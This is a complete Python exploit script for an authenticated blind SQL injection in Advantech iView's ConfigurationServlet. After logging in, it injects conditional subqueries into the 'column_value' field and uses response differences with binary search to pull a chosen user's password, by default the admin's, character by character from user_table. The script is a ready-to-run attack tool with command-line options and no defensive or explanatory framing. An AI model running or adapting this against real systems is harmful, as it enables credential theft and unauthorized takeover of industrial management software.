import sys, argparse, requests

descr = 'Advantech iView ConfigurationServlet Authenticated SQL Injection (User Password Retrieval)'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='Target host/IP')
required.add_argument('-L', '--login',required=True, help='user to login as')
required.add_argument('-P', '--password',required=True, help='login password')
parser.add_argument('-p', '--port', type=int, default=8080, help='Advantech iView port, default: %(default)s')
parser.add_argument('-u', '--user', default='admin', help='Advantech iView user whose password to retrieve, default: %(default)s')

args = parser.parse_args()
host = args.target
port = args.port
user = args.user
login= args.login
password= args.password


def get_passwd_len():

  for i in range(3, 61):
    sqli = "(SELECT  IF (LENGTH((SELECT`strUserPassword`FROM(user_table) /*!WHERE*/ strUserName = '" + user + "')) = " + str(i) + ",0,99999999999999999))"

    data = {
      'page_action_type'  : 'setConfiguration',
      'column_name'       : 'nUseCustomDescription', 
      'column_value'      : sqli 
    }
    
    r = sess.post(url, data=data)
    if 'Configuration Update Success' in r.text:
      return i

  return -1 
  

def test(pos, op, v):
    sqli = "(SELECT  IF(ORD(MID((SELECT`strUserPassword`FROM(user_table) /*!WHERE*/ strUserName = '" + user + "'), " + str(pos) + ", 1)) " + op + " " + str(v) + ",0,99999999999999999))"

    data = {
      'page_action_type'  : 'setConfiguration',
      'column_name'       : 'nUseCustomDescription', 
      'column_value'      : sqli 
    }
      
    r = sess.post(url, data=data)
    #print(sqli)
    #print(r.text)
    if 'Configuration Update Success' in r.text:
      return True
    else:
      return False
 

def bsearch(pos, low, high):

  #print('{} - {}'.format(low, high))
  if high >= low:
    mid = (high + low) // 2
    
    if test(pos, '=', mid):
      return chr(mid)
    elif test(pos, '>', mid):
      return bsearch(pos, mid + 1, high)
    else:
      return bsearch(pos, low, mid - 1)
         
  else: 
    return None 
 

#
# Login
#
sess = requests.Session()

print('Logging in as user "{}"'.format(login))

url = 'http://{}:{}/iView3/CommandServlet'.format(host, port)
data = {
  'page_action_service' : 'UserServlet',
  'page_action_type'    : 'login',
  'user_name'           : login,
  'user_password'       : password 
}
r = sess.post(url, data=data, verify=False)

if r.status_code != 200 or 'Success' not in r.text:
  sys.exit('Login failed.');

url = 'http://{}:{}/iView3/ConfigurationServlet'.format(host, port)
print('Performing blind SQLi to get password length for user "{}"...'.format(user)) 
pw_len = get_passwd_len()

if pw_len >= 3:
  print('Password length for user "{}" is {}'.format(user, pw_len)) 
else:
  sys.exit('Failed to get password length for user "{}"'.format(user)) 

print('Performing blind SQLi to get password for user "{}"...'.format(user)) 
pw = ''
ok = True 
for pos in range(1, pw_len + 1):   
  ch = bsearch(pos, 32, 127) 
  if ch != None:
    pw += ch 
  else:
    print('Failed to get character at position {} of the password'.format(pos))
    ok = False 

if ok:
  print('Password for user "{}" is {}'.format(user, pw)) 
